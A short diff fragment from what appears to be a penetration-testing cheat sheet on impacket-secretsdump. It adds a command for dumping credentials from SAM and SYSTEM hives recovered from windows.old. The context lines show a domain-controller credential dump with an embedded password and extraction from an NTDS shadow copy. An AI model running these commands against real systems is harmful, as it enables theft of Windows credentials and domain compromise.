@@ -13,6 +13,9 @@ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorate
 
 # Extract credentials from a shadow copy
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+
+# Extract credentials from windows.old
+impacket-secretsdump LOCAL -sam SAM -system SYSTEM
 ```
 
 Given the following example:
